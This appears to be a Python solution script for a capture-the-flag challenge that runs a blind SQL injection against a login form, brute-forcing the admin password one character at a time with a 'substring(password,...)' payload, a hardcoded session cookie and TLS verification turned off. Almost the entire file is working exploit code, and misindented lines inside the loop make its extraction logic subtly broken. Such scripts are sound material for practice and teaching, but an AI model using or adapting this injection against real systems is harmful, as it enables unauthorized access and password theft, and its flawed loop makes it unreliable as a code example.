#!/usr/bin/python

#coding: utf-8

import requests
import string
import sys
requests.packages.urllib3.disable_warnings()

# Request needed informations (examples)
BASE_URL = "your_url"
PARAMS = {
        'username': 'admin',
        'password': '',
        'nonce' : '58109a1ef582bab83c89b9435d455e527b44736e43d64750604f7c2a3012f404ba282e19278431cad17852fa9475b2a01a8ddf9551d6b6cfaa5fa6311ceddb5a',
        }

# Static variables
KEYWORD = "Le mot de passe est le flag."
MAX_PWD_LENGTH = 255
URL = "your_url"
VULNERABLE_PARAM = "example : password="
INJECTION_USED = "example : username=admin&password=' or substring(password,1,1)='E"

# Password variables
passwordLength = 37
password = "ECW{"

if __name__ == "__main__":
    print("\n#####################################")
    print("## Your description                  ##")
    print("#####################################\n")

    print("[+] URL injected : %s" % URL)
    print("[+] Vulnerable parameter : %s" % VULNERABLE_PARAM)
    print("[+] Injection used : %s" % INJECTION_USED)

    print("\n[+] Starting bruteforce\n")

    s = requests.Session()

    COOKIE = dict(session=".eJwNj8tqwzAQRX-lzNoLx003hi4KstMGZoyLYiHt1NixpUgqJBQ_Qv69szucy1ncBwSbRijhcoMM0m86D1A-4OWHFclxQREmVF1kXnWsXSPINyK4RrYbqTYn2QWSX6_aM29YGPZGaObTTP4jN773GKsNRbUa3850OE7ox9XI6g39eU8CF13UV5TM8hi1vHLbOW5mVNXeHL5jI087VG2hvfEm1hMpM5HHBRUF3h2p6h2eGfzdh1uykQ_Ap7UL_7F9dAnKiw33IQPXQ7kr8uc_UPNP7A.DMdGMg.UMD8szIENKxcuos1Rmk0Zqzd_8s")

    for i in range(5, passwordLength):
        charset = "abcdef0123456789"
        for j in charset:
            sys.stdout.write("\r")
            sys.stdout.write("[+] Password : %s%c" % (password,j))
            sys.stdout.flush()
            PARAMS['password'] = "' or substring(password,1,"+ str(i) +")='" + password + j
            req = s.post(url=BASE_URL, data=PARAMS, cookies=COOKIE, verify=False)
            if KEYWORD in req.text:
                password += j
                break;

            password = password + "}"
            print("\n[+] Done\n")
            print("[+] Password is %s\n" % password)
